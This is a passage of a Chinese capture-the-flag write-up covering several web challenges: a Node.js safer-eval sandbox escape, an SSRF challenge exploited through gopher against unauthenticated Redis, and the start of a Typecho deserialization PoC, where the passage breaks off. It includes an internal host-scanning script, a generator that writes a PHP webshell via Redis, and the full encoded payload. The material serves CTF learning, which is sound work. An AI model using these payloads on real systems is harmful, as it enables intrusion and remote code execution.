class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>      response <span class="token operator">=</span> <span class="token function">saferEval</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>      response <span class="token operator">=</span> <span class="token string">'Wrong Wrong Wrong!!!!'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">String</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算 KPI</span></pre></td></tr><tr><td data-num="51"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>  res<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/javascript;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./index.js'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre></pre></td></tr><tr><td data-num="56"></td><td><pre><span class="token comment">// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口</span></pre></td></tr><tr><td data-num="57"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/version'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>  res<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/json;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./package.json'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="61"></td><td><pre></pre></td></tr><tr><td data-num="62"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>  res<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="65"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="66"></td><td><pre></pre></td></tr><tr><td data-num="67"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="68"></td><td><pre>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Start listening'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="69"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>后面的部分都在首页面给出了，题目的核心在两个 eval 路由上，先看第一个</p><figure class="highlight js"><figcaption data-lang="JavaScript"></figcaption><table><tr><td data-num="1"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token comment">// 如果请求路径为 '/eval'</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>path <span class="token operator">===</span> <span class="token string">'/eval'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token comment">// 设置延迟时间为 60 秒</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">let</span> delay <span class="token operator">=</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>delay<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">// 如果请求参数中有 delay 参数，则将延迟时间设置为 delay 参数的值和当前延迟时间的最大值</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>Number<span class="token punctuation">.</span><span class="token function">isInteger</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>delay<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>      delay <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>delay<span class="token punctuation">,</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>delay<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token comment">// 设置一个定时器，延迟时间到期后执行 next () 函数</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">const</span> t <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我 p 事</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token comment">// 如果延迟时间过长，设置一个 1 秒的定时器，到期后清除之前设置的定时器，并返回 'Timeout!' 字符串</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>      <span class="token function">clearTimeout</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'timeout'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Timeout!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token comment">// 如果请求路径不为 '/eval'，则执行 next () 函数</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>简答来说就是通过 <code>/eval?delay=</code> 上传一个数字并和 60000 比较，大的赋值给 delay</p><figure class="highlight perl"><figcaption data-lang="perl"></figcaption><table><tr><td data-num="1"></td><td><pre>浏览器内部使用<span class="token number">32</span>位带符号的整数来储存推迟执行的时间这意味着setTimeout最多延迟<span class="token number">2147483647</span>秒（<span class="token number">24.8</span>天）。只要大于<span class="token number">2147483647</span><span class="token punctuation">,</span>就会发生溢出</pre></td></tr></table></figure><p>根据版本找到一个 cve<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NvbW1lbnRob2wvc2FmZXItZXZhbC9pc3N1ZXMvMTA=">Breakout · Issue #10 · commenthol/safer-eval (github.com)</span>，直接用就行</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051628984.png" alt="image-20230405162804912"></p><h3 id="ez三剑客-ezweb"><a class="anchor" href="#ez三剑客-ezweb">#</a> EZ 三剑客 - EzWeb</h3><p>看源码有一个 get 传参</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051629938.png" alt="image-20230405162919887"></p><p>访问</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051629926.png" alt="image-20230405162928878"></p><p>给了网卡信息，<span class="exturl" data-url="aHR0cDovL3huLS13d3ctMHYxZWw1YmM3cGkwMmIwNzBkLmJhaWR1LmNvbQ==">在前段输入 www.baidu.com</span>, 可以访问到这个页面。又是一个 ssrf</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051630056.png" alt="image-20230405163052975"></p><p>不让访问 127.0.0.1 但是可以使用真实 ip</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051636213.png" alt="image-20230405163646133"></p><p>尝试使用 file 读文件 file 协议被过滤了，尝试通过 file:/ 或者 file: // 去绕过</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051641155.png" alt="image-20230405164131078"></p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">function</span> <span class="token function-definition function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  </pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">echo</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>		<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>		<span class="token comment">//echo $url."\n";</span></pre></td></tr><tr><td data-num="13"></td><td><pre>		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">,</span><span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>			<span class="token comment">//var_dump($match);</span></pre></td></tr><tr><td data-num="16"></td><td><pre>			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'别这样'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>		<span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ifconfig'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>过滤了 file://、dict、127.0.0.1、localhost，还能使用 gopher 协议和 http 协议</p><p>先使用 http 服务探测存活主机，这里用 burp 的探测会卡住，简单的用 python 判断</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://d3edfd3a-f06a-42ad-9bf4-fb994618272a.node4.buuoj.cn:81/index.php"</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	getdata <span class="token operator">=</span> <span class="token string">"?url=http://10.244.80."</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"&amp;submit=%E6%8F%90%E4%BA%A4"</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	urs_l <span class="token operator">=</span> url <span class="token operator">+</span> getdata</pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token comment"># print(urs_l)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>		re <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urs_l<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>		<span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>RequestException<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"失败   "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>		<span class="token keyword">pass</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>	time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051720575.png" alt="image-20230405172033524"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051720183.png" alt="image-20230405172015095"></p><p>接着扫描端口，6379 端口是开放的，有 redis 服务，gopher 打 ssrf，redis 的未授权访问漏洞，这里贴一下网上找到的 python2 的脚本这里改一下用 python3 跑</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 导入 quote 函数</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment"># 定义协议、IP、端口、要写入的 PHP 代码、文件名、路径、密码、命令列表</span></pre></td></tr><tr><td data-num="5"></td><td><pre>protocol <span class="token operator">=</span> <span class="token string">"gopher://"</span></pre></td></tr><tr><td data-num="6"></td><td><pre>ip <span class="token operator">=</span> <span class="token string">"10.244.80.203"</span></pre></td></tr><tr><td data-num="7"></td><td><pre>port <span class="token operator">=</span> <span class="token string">"6379"</span></pre></td></tr><tr><td data-num="8"></td><td><pre>shell <span class="token operator">=</span> <span class="token string">"\n\n&lt;?php system(\"cat /flag\");?>\n\n"</span></pre></td></tr><tr><td data-num="9"></td><td><pre>filename <span class="token operator">=</span> <span class="token string">"1.php"</span></pre></td></tr><tr><td data-num="10"></td><td><pre>path <span class="token operator">=</span> <span class="token string">"/var/www/html"</span></pre></td></tr><tr><td data-num="11"></td><td><pre>passwd <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="12"></td><td><pre>cmd <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"flushall"</span><span class="token punctuation">,</span>  <span class="token comment"># 清空 Redis 数据库</span></pre></td></tr><tr><td data-num="13"></td><td><pre>       <span class="token string">"set 1 &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>shell<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># 将 PHP 代码写入 Redis 中</span></pre></td></tr><tr><td data-num="14"></td><td><pre>       <span class="token string">"config set dir &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># 设置 Redis 工作目录</span></pre></td></tr><tr><td data-num="15"></td><td><pre>       <span class="token string">"config set dbfilename &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># 设置 Redis 数据库文件名</span></pre></td></tr><tr><td data-num="16"></td><td><pre>       <span class="token string">"save"</span>  <span class="token comment"># 将 Redis 数据库保存到磁盘中</span></pre></td></tr><tr><td data-num="17"></td><td><pre>       <span class="token punctuation">]</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token comment"># 如果设置了密码，将 AUTH 命令添加到命令列表中</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token keyword">if</span> passwd<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    cmd<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"AUTH &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token comment"># 拼接 payload</span></pre></td></tr><tr><td data-num="24"></td><td><pre>payload <span class="token operator">=</span> protocol <span class="token operator">+</span> ip <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> port <span class="token operator">+</span> <span class="token string">"/_"</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token comment"># 定义 redis_format 函数，将命令转换为 Redis 格式</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token keyword">def</span> <span class="token function">redis_format</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    CRLF <span class="token operator">=</span> <span class="token string">"\r\n"</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    redis_arr <span class="token operator">=</span> arr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    cmd <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    cmd <span class="token operator">+=</span> <span class="token string">"*"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>redis_arr<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token keyword">for</span> x <span class="token keyword">in</span> redis_arr<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        cmd <span class="token operator">+=</span> CRLF <span class="token operator">+</span> <span class="token string">"$"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> CRLF <span class="token operator">+</span> x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    cmd <span class="token operator">+=</span> CRLF</pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token keyword">return</span> cmd</pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token comment"># 将每个命令转换为 Redis 格式，并拼接到 payload 中</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">for</span> x <span class="token keyword">in</span> cmd<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        payload <span class="token operator">+=</span> quote<span class="token punctuation">(</span>redis_format<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token comment">#gopher://10.244.80.203:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%245%0D%0A1.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span></pre></td></tr></table></figure><p>访问木马文件就能拿到 flag</p><h3 id="ez三剑客-eztypecho"><a class="anchor" href="#ez三剑客-eztypecho">#</a> EZ 三剑客 - EzTypecho</h3><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051750723.png" alt="image-20230405175019643"></p><p>直接去找 Typecho 的 cve，看到是有反序列化漏洞的<span class="exturl" data-url="aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzQyNC8jMHgwMQ=="> Typecho 前台 getshell 漏洞分析 (seebug.org)</span></p><p>这个直接用网上的 poc 打就行</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Typecho_Request</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$_params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$_filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span 